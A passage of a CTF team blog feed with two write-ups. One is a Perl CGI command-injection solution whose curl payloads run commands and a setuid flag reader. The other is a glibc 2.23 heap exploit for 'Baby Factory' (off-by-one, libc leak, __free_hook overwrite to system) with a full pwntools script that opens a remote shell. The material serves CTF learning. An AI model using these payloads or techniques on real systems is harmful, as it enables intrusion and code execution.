class="string">"http://13.231.137.9/cgi-bin/diag.cgi?options=-r\$x=\"ls%20/\",exec\$x%23%202&gt;./tmp/qw.thtml%20&lt;&amp;tpl=qw"</span></span><br><span class="line"><span class="variable">$READ_FLAG</span>$</span><br><span class="line">FLAG</span><br><span class="line">bin</span><br><span class="line">boot</span><br><span class="line">dev</span><br><span class="line">etc</span><br><span class="line">home</span><br><span class="line">initrd.img</span><br><span class="line">initrd.img.old</span><br><span class="line">lib</span><br><span class="line">lib64</span><br><span class="line">lost+found</span><br><span class="line">media</span><br><span class="line">mnt</span><br><span class="line">opt</span><br><span class="line">proc</span><br><span class="line">root</span><br><span class="line">run</span><br><span class="line">sbin</span><br><span class="line">snap</span><br><span class="line">srv</span><br><span class="line">sys</span><br><span class="line">tmp</span><br><span class="line">usr</span><br><span class="line">var</span><br><span class="line">vmlinuz</span><br><span class="line">vmlinuz.old</span><br></pre></td></tr></table></figure><p>And it worked we managed to run <strong>ls</strong>, but we now see <code>$READ_FLAG$</code> which is an executable and the file <strong>FLAG</strong> containing the flag , we don’t rights to read directly only root can, our user is <strong>www-data</strong>, but if we manage to run the executable <code>$READ_FLAG$</code> (setuid bit is enabled so it will run as root which is the file owner). </p><p>I run into some problems because of the file name there is some shitty symbols($) so we need to do some tricks to be able to execute:</p><ul><li>Backslash with <strong>\x5c</strong> dolar signs so they won’t be interpreted as a bash variable.</li><li>Write dolar signs as <strong>\x24</strong> so they won’t be interpreted as a perl variable in a double quoted string.</li><li>Use <strong>sh -c ‘executable’</strong> to execute the binary.</li></ul><p>The final payload without url encoding looks like this:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-r\$x=\<span class="string">"sh -c '/\x5c\x24READ_FLAG\x5c\x24'"</span>,<span class="keyword">exec</span>\$x<span class="comment"># 2&gt;./tmp/qw.thtml &lt;&amp;tpl=qw</span></span><br></pre></td></tr></table></figure><p>With url encoding:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-r\$x=\<span class="string">"sh%20-c%20'/\x5c\x24READ_FLAG\x5c\x24'\",exec\$x%23%202&gt;./tmp/qw.thtml%20&amp;tpl=qw</span></span><br></pre></td></tr></table></figure><p>Running with curl:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ curl <span class="string">"http://13.231.137.9/cgi-bin/diag.cgi?options=-r\$x=\"sh%20-c%20'/\x5c\x24READ_FLAG\x5c\x24'\",exec\$x%23%202&gt;./tmp/qw.thtml%20&lt;&amp;tpl=qw"</span></span><br><span class="line">hitcon&#123;Now I<span class="string">'m sure u saw my Bl4ck H4t p4p3r :P&#125;</span></span><br></pre></td></tr></table></figure></p><p>The flag was:<br><img src="https://i.imgur.com/DEbUX4H.png" alt></p><p>References:</p><ul><li><a href="https://blog.orange.tw/2019/09/attacking-ssl-vpn-part-3-golden-pulse-secure-rce-chain.html" target="_blank" rel="noopener">https://blog.orange.tw/2019/09/attacking-ssl-vpn-part-3-golden-pulse-secure-rce-chain.html</a></li><li><a href="https://i.blackhat.com/USA-19/Wednesday/us-19-Tsai-Infiltrating-Corporate-Intranet-Like-NSA.pdf" target="_blank" rel="noopener">https://i.blackhat.com/USA-19/Wednesday/us-19-Tsai-Infiltrating-Corporate-Intranet-Like-NSA.pdf</a></li></ul><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;Virtual Public Network [183pts]&lt;/p&gt;
&lt;p&gt;Vulnerable Point of Your Network :)&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://13.231.137.9&quot; target=&quot;_bla
      
    
    </summary>
    
      <category term="Web" scheme="https://teamrocketist.github.io/categories/Web/"/>
    
    
      <category term="perl" scheme="https://teamrocketist.github.io/tags/perl/"/>
    
      <category term="cgi" scheme="https://teamrocketist.github.io/tags/cgi/"/>
    
      <category term="vpnssl" scheme="https://teamrocketist.github.io/tags/vpnssl/"/>
    
  </entry>
  
  <entry>
    <title>[Pwn] PwnThyBytes 2019 - Baby Factory</title>
    <link href="https://teamrocketist.github.io/2019/09/30/Pwn-PwnThyBytes-2019-Baby-Factory/"/>
    <id>https://teamrocketist.github.io/2019/09/30/Pwn-PwnThyBytes-2019-Baby-Factory/</id>
    <published>2019-09-30T11:48:53.000Z</published>
    <updated>2022-08-23T00:14:55.165Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>Baby Factory<br>100</p><p>Author: FedEx</p><p>In order to keep the world perfectly balanced, as all things should be, we’ve designed a management system.</p><p>Don’t forget, with great power comes great responsability!</p><p>Prove yourself worthy.</p><p>nc 137.117.216.128 13373</p><p><a href="https://mega.nz/#F!mjg2wQBT!Jm6rb3meWpIRR6pkpv_SrQ" target="_blank" rel="noopener">Download</a></p></blockquote><p>Another heap challenge, libc-2.23 is used so no <strong>tcache</strong> on this version .</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ file babyfactory</span><br><span class="line">babyfactory: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, <span class="keyword">for</span> GNU/Linux 2.6.32, BuildID[sha1]=e40dbc48ecfd16e9c12a93c42520cf9f85e2671b, stripped</span><br></pre></td></tr></table></figure><p>With this we know:</p><ul><li>ELF compiled for x86_x64 architecture.</li><li>Dynamically linked.</li><li>Stripped (A little bit harder to reverse).</li></ul><p>As usual the next thing is to check the security of the binary<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ checksec babyfactory</span><br><span class="line">[*] <span class="string">'/ctf/pwnthybytes2019/pwn/babyfactory/babyfactory'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure></p><p>Brief analysis of these protections:</p><ul><li>FULL RELRO (<strong>GOT</strong> entries are read only we can’t overwrite them)</li><li>STACK CANARY (The stack is protected with the canary if there is a stack overflow we need to find a way to <strong>leak</strong> it)</li><li>The Stack is not executable (We can’t execute shellcode, techniques like <strong>ROP</strong> can bypass this)</li><li>PIE (Position Independent Executable) is on (If we want to use rop we need a way to leak the base address)</li></ul><h3 id="Testing-the-binary"><a href="#Testing-the-binary" class="headerlink" title="Testing the binary"></a>Testing the binary</h3><p>The binary comes with the usual options on a normal heap challenge, create, edit,lists and eliminate.</p><p>Let’s start by doing static analysis on create and edit:<br><a data-fancybox="gallery" href="https://i.imgur.com/I0nAh0U.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/I0nAh0U.png" alt><br></a></p><p>Delete <strong>doesn’t</strong> have any kind of vulnerability so <strong>no</strong> double free or use after free possible, print will show every <strong>allocated object</strong>,  <strong>create</strong> is limited to <strong>7 mallocs</strong> because of variable at <strong>piebase+0x202024</strong> this variable increases at <strong>each allocation</strong> and goes up to <strong>7</strong>, after that <strong>no</strong> more allocations are allowed and the string “Too many, sorry” is shown.</p><h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><p>We have some limitations on the allocation sizes we can only do <strong>0x68,0x69 and 0x10</strong>, because of this all the chunks when freed will fall into <strong>fastbin range</strong>. </p><p>We can use <strong>off by one</strong> vulnerability to overflow the size of a chunk to be able to get a greater sized chunk  ultrapassing the fastbin range (0x81), this is useful to get a chunk into an <strong>unsorted bin</strong> to get a leak of a <strong>libc</strong> address. </p><p>We can also use this to manage to get <strong>arbitrary write</strong> by changing the pointer of char* name to the address we want for example free_hook and update its value into system to get a shell.</p><p>The memory layout on the heap will be a little weird because of the created struct, <strong>malloc(0x10)</strong> stores the pointers/values of objects of the <strong>struct xpto</strong>. </p><p>Normally, when programming in c we do <code>malloc(sizeof(struct xpto))</code>, <code>sizeof(struct xpto)</code> is equal to <strong>0x10</strong> and why? <code>char*</code> pointer and <code>long</code> integer are “objects” of the struct, the memory needed to store this objects are <strong>0x8 for the char*</strong> and <strong>0x8 for the long int</strong> this makes <strong>0x8+0x8=0x10</strong>.</p><p>This the view of a struct object in memory:<br><a data-fancybox="gallery" href="https://i.imgur.com/5YdkpUR.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/5YdkpUR.png" alt><br></a><br>The plan is:</p><ul><li>Malloc “boy chunk” A,B and C and set day to -1(0xfffffffff).</li><li>Edit will think A is a “girl chunk” we can use this to overflow the size of chunk B with 0x91.</li><li>Free chunk B (To achieve success on freeing this a fake chunk needs to be created at chunk B(name)) chunk will be inserted into unsorted bin updating fd and bk with libc addresses.</li><li>Next malloc will be placed right above of the freed chunk(chunk_overlap). </li><li>Leak libc with print.</li><li>Overflow again the size of 0x21 but this time to 0x71 by editing chunk A again.</li><li>Freeing chunk B will put this into a fastbin.</li><li>Use next boy allocation to update the new 0x21 chunk to 0x71 to prevent errors from security check for the next malloc.</li><li>Next allocated “boy chunk” will be placed right at the char* name pointer of chunk B, modify it with free_hook pointer.</li><li>By editing chunk B we will write into the char* name pointer which got modified previously by us into free_hook set it into system.</li><li>Edit chunk A data into ‘/bin/sh\x00’</li><li>Free chunk A to Trigger free_hook and get a shell.</li></ul><h3 id="Off-by-One"><a href="#Off-by-One" class="headerlink" title="Off by One"></a>Off by One</h3><p>Lets start by allocate 3 chunks with</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">1</span>,<span class="string">'A'</span>*<span class="number">0x8</span>, <span class="number">0xffffffff</span>) <span class="comment"># 0</span></span><br><span class="line">add(<span class="number">1</span>,<span class="string">'B'</span>*<span class="number">0x8</span>, <span class="number">0xffffffff</span>) <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">1</span>,<span class="string">"C"</span>*<span class="number">0x8</span>, <span class="number">0xffffffff</span>) <span class="comment"># 2</span></span><br></pre></td></tr></table></figure><p><a data-fancybox="gallery" href="https://i.imgur.com/XZuG6S8.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/XZuG6S8.png" alt><br></a><br>Now we want to overwrite chunk B(0x21) size to 0x91 this way we can make this chunk into unsortedbin range:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">edit(<span class="number">0x0</span>, <span class="string">'\x91'</span>*<span class="number">0x69</span>)</span><br></pre></td></tr></table></figure><p><a data-fancybox="gallery" href="https://i.imgur.com/L6Sh7UP.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/L6Sh7UP.png" alt><br></a><br>Lets see what happens when we free this chunk:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">free(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p><a data-fancybox="gallery" href="https://i.imgur.com/7pFQP8A.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/7pFQP8A.png" alt><br></a><br>Now lets malloc<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">1</span>,<span class="string">'\xb0'</span>, <span class="number">0xffffffff</span>) <span class="comment"># 1</span></span><br></pre></td></tr></table></figure></p><p><a data-fancybox="gallery" href="https://i.imgur.com/j2wo7wk.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/j2wo7wk.png" alt><br></a><br>Now we can get libc address from index 1:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">list()</span><br><span class="line">r.recvuntil(<span class="string">'[1] GIRL= '</span>)</span><br><span class="line">addr = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">0x8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">LIBC = addr<span class="number">-0x3c4bb0</span></span><br><span class="line">FREE_HOOK = LIBC+libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line">SYSTEM = LIBC+libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">log.info(<span class="string">"LEAKED 0x%x"</span>, addr)</span><br><span class="line">log.info(<span class="string">"LIBC 0x%x"</span>, LIBC)</span><br><span class="line">log.info(<span class="string">"FREE_HOOK 0x%x"</span>, FREE_HOOK)</span><br></pre></td></tr></table></figure><p>Now it’s time to overflow chunk B again but this time to 0x71 and free it:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">edit(<span class="number">0x0</span>, <span class="string">'\x71'</span>*<span class="number">0x69</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p><a data-fancybox="gallery" href="https://i.imgur.com/muJzhNH.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/muJzhNH.png" alt><br></a><br>This is what happens if we don’t create that fake chunk at that location:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$ root@ptb:/ctf/work/pwn/babyfactory<span class="comment"># python babyfactory.py</span></span><br><span class="line">[*] <span class="string">'/ctf/work/pwn/babyfactory/babyfactory'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">[*] <span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">'./babyfactory'</span>: pid 8668</span><br><span class="line">[*] LEAKED 0x7f0f80e67bb0</span><br><span class="line">[*] LIBC 0x7f0f80aa3000</span><br><span class="line">[*] FREE_HOOK 0x7f0f80e697a8</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">*** Error <span class="keyword">in</span> `./babyfactory<span class="string">': free(): invalid next size (fast): 0x000055b286da70a0 ***</span></span><br></pre></td></tr></table></figure><p>Next size is zero making it an invalid size lets check the code in <a href="https://github.com/andigena/glibc-2.23-0ubuntu3/blob/master/malloc/malloc.c#L3909" target="_blank" rel="noopener">malloc.c</a>:<br><a data-fancybox="gallery" href="https://i.imgur.com/3tjCD3E.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/3tjCD3E.png" alt><br></a><br>Lets fix this by adjusting in the beginning of our script:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">1</span>,<span class="string">'A'</span>*<span class="number">0x8</span>, <span class="number">0xffffffff</span>) <span class="comment"># 0</span></span><br><span class="line">add(<span class="number">1</span>,p64(<span class="number">0</span>)*<span class="number">9</span>+p64(<span class="number">0x71</span>), <span class="number">0xffffffff</span>) <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">1</span>,<span class="string">"C"</span>*<span class="number">0x8</span>, <span class="number">0xffffffff</span>) <span class="comment"># 2  separate the released chunk from the top chunk.</span></span><br></pre></td></tr></table></figure><p>Now free will work and we get this :<br><a data-fancybox="gallery" href="https://i.imgur.com/DmgxuqH.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/DmgxuqH.png" alt><br></a><br>Now next malloc:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">1</span>, p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x71</span>),<span class="number">0xffffffff</span>) <span class="comment"># 1</span></span><br></pre></td></tr></table></figure><p><a data-fancybox="gallery" href="https://i.imgur.com/7pXnJ0R.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/7pXnJ0R.png" alt><br></a><br>As explained in the picture above p64(0)+p64(0)+p64(0)+p64(0x71) to bypass <a href="https://github.com/andigena/glibc-2.23-0ubuntu3/blob/master/malloc/malloc.c#L3384" target="_blank" rel="noopener">this</a> security check:<br><a data-fancybox="gallery" href="https://i.imgur.com/cJOOtIc.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/cJOOtIc.png" alt><br></a><br>Remember fastbin(0x70) is something like this right now:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x70: 0x5620cb07a0b0 —▸ 0x5620cb07a0a0 ◂— 0x0</span><br></pre></td></tr></table></figure><p>Remember before we exchanged the size to 0x91 the old size was 0x21 this means that this was place that stored the pointers of the structure which means if we modify the first field of this chunk we will change the pointer of <strong>char* name</strong> into <strong>free_hook</strong> next edit will write directly into free_hook giving us an arbitrary write free of security checks:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">1</span>, p64(FREE_HOOK),<span class="number">0xffffffff</span>) <span class="comment"># 3</span></span><br></pre></td></tr></table></figure><p>The look of the heap before the 1st pointer gets updated to free_hook:<br><a data-fancybox="gallery" href="https://i.imgur.com/EWP9H1C.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/EWP9H1C.png" alt><br></a><br>The look after update to free_hook occurs:<br><a data-fancybox="gallery" href="https://i.imgur.com/dsuVkAW.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/dsuVkAW.png" alt><br></a><br>Now setting free_hook into system putting “/bin/sh” into index 0 , by freeing index 0 we trigger free_hook and get a shell:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">edit(<span class="number">1</span>, p64(SYSTEM))</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>The full exploit:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">host, port = <span class="string">"137.117.216.128"</span>, <span class="string">"13373"</span></span><br><span class="line">filename = <span class="string">"./babyfactory"</span></span><br><span class="line">elf = ELF(filename)</span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> args.REMOTE:</span><br><span class="line">    libc = elf.libc</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    libc = ELF(<span class="string">'./libc-2.23.so'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getConn</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> process(filename) <span class="keyword">if</span> <span class="keyword">not</span> args.REMOTE <span class="keyword">else</span> remote(host, port)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_PIE</span><span class="params">(proc)</span>:</span></span><br><span class="line">    memory_map = open(<span class="string">"/proc/&#123;&#125;/maps"</span>.format(proc.pid),<span class="string">"rb"</span>).readlines()</span><br><span class="line">    <span class="keyword">return</span> int(memory_map[<span class="number">0</span>].split(<span class="string">"-"</span>)[<span class="number">0</span>],<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(bp)</span>:</span></span><br><span class="line">    script = <span class="string">""</span></span><br><span class="line">    PIE = get_PIE(r)</span><br><span class="line">    PAPA = PIE</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> bp:</span><br><span class="line">        script += <span class="string">"b *0x%x\n"</span>%(PIE+x)</span><br><span class="line">    gdb.attach(r,gdbscript=script)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(obj, name, day)</span>:</span></span><br><span class="line">r.sendlineafter(<span class="string">'[5] Abandon Baby\n &gt; '</span>,<span class="string">'1'</span>)</span><br><span class="line">r.sendlineafter(<span class="string">'[2] Girl \n &gt; '</span>,str(obj))</span><br><span class="line">r.sendafter(<span class="string">'Enter Name: '</span>, name)</span><br><span class="line">r.sendlineafter(<span class="string">'Enter Day: '</span>, str(day))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index, name)</span>:</span></span><br><span class="line">r.sendlineafter(<span class="string">'[5] Abandon Baby\n &gt; '</span>,<span class="string">'2'</span>)</span><br><span class="line">r.sendlineafter(<span class="string">'Enter Baby IDX: '</span>, str(index))</span><br><span class="line">r.sendafter(<span class="string">'Enter new name: '</span>, name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">list</span><span class="params">()</span>:</span></span><br><span class="line">r.sendlineafter(<span class="string">'[5] Abandon Baby\n &gt; '</span>,<span class="string">'3'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">r.sendlineafter(<span class="string">'[5] Abandon Baby\n &gt; '</span>,<span class="string">'4'</span>)</span><br><span class="line">r.sendlineafter(<span class="string">'Enter Baby IDX: '</span>, str(index))</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'new-window'</span>]</span><br><span class="line">r = getConn()</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> args.REMOTE <span class="keyword">and</span> args.GDB:</span><br><span class="line">debug([<span class="number">0xc7b</span>,<span class="number">0x1072</span>]) <span class="comment"># malloc 0xc7b malloc 0xc88 free 0x1072 edit 0xf92</span></span><br><span class="line">add(<span class="number">1</span>,<span class="string">'A'</span>*<span class="number">0x8</span>, <span class="number">0xffffffff</span>) <span class="comment"># 0</span></span><br><span class="line">add(<span class="number">1</span>,p64(<span class="number">0</span>)*<span class="number">9</span>+p64(<span class="number">0x71</span>), <span class="number">0xffffffff</span>) <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">1</span>,<span class="string">"C"</span>*<span class="number">0x8</span>, <span class="number">0xffffffff</span>) <span class="comment"># 2  separate the released chunk from the top chunk.</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0x0</span>, <span class="string">'\x91'</span>*<span class="number">0x69</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>,<span class="string">'\xb0'</span>, <span class="number">0xffffffff</span>) <span class="comment"># 1</span></span><br><span class="line">list()</span><br><span class="line">r.recvuntil(<span class="string">'[1] GIRL= '</span>)</span><br><span class="line">addr = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">0x8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">LIBC = addr<span class="number">-0x3c4bb0</span></span><br><span class="line">FREE_HOOK = LIBC+libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line">SYSTEM = LIBC+libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">log.info(<span class="string">"LEAKED 0x%x"</span>, addr)</span><br><span class="line">log.info(<span class="string">"LIBC 0x%x"</span>, LIBC)</span><br><span class="line">log.info(<span class="string">"FREE_HOOK 0x%x"</span>, FREE_HOOK)</span><br><span class="line">edit(<span class="number">0x0</span>, <span class="string">'\x71'</span>*<span class="number">0x69</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>, p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x71</span>),<span class="number">0xffffffff</span>) <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">1</span>, p64(FREE_HOOK),<span class="number">0xffffffff</span>) <span class="comment"># 3</span></span><br><span class="line">edit(<span class="number">1</span>, p64(SYSTEM))</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line">r.close()</span><br></pre></td></tr></table></figure><p>Running it:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">$ python babyfactory.py REMOTE</span><br><span class="line">[*] <span class="string">'/ctf/pwnthybytes2019/pwn/babyfactory/babyfactory'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">[*] <span class="string">'/ctf/pwnthybytes2019/pwn/babyfactory/libc-2.23.so'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">[+] Opening connection to 137.117.216.128 on port 13373: Done</span><br><span class="line">[*] LEAKED 0x7fec914ecbb0</span><br><span class="line">[*] LIBC 0x7fec91128000</span><br><span class="line">[*] FREE_HOOK 0x7fec914ee7a8</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ cat home/babyfactory/flag</span><br><span class="line">PTBCTF&#123;d516da8f4726509484aa98eabd8e095f&#125;</span><br></pre></td></tr></table></figure></p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;Baby Factory&lt;br&gt;100&lt;/p&gt;
&lt;p&gt;Author: FedEx&lt;/p&gt;
&lt;p&gt;In order to keep the world perfectly balanced, as all things should be, we’v
      
    
    </summary>
    
      <category term="Pwn" scheme="https://teamrocketist.github.io/categories/Pwn/"/>
    
      <category term="x64" scheme="https://teamrocketist.github.io/categories/Pwn/x64/"/>
    
      <category term="Glibc Malloc" scheme="https://teamrocketist.github.io/categories/Pwn/x64/Glibc-Malloc/"/>
    
      <category term="Off By One" scheme="https://teamrocketist.github.io/categories/Pwn/x64/Glibc-Malloc/Off-By-One/"/>
    
    
      <category term="heap" scheme="https://teamrocketist.github.io/tags/heap/"/>
    
      <category term="off_by_one" scheme="https://teamrocketist.github.io/tags/off-by-one/"/>
    
